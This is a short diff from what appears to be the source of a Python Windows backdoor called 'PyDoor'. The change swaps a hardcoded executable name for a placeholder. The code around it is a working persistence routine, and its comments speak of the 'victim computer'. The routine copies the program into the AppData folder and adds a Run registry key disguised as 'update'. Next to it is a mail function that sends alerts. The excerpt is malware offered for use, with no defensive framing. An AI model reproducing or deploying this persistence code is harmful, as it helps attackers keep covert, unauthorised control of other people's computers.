@@ -44,7 +44,7 @@ def send_mail(host, port):
     mail.sendmail('your_email@gmail.com', 'your_email@gmail.com', txt)  # Function For Sending Alert Message With Mail
 
 def persistent():
-    evil_file_location = os.environ["appdata"] + "\\PyDoor.exe"
+    evil_file_location = os.environ["appdata"] + "\\NAMEOFTHEFILE.exe"#THE NAME OF THE EXECUTABLE
     if not os.path.exists(evil_file_location):
         shutil.copyfile(sys.executable, evil_file_location)
         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)  # Function For Being Persisting On Victim Computer
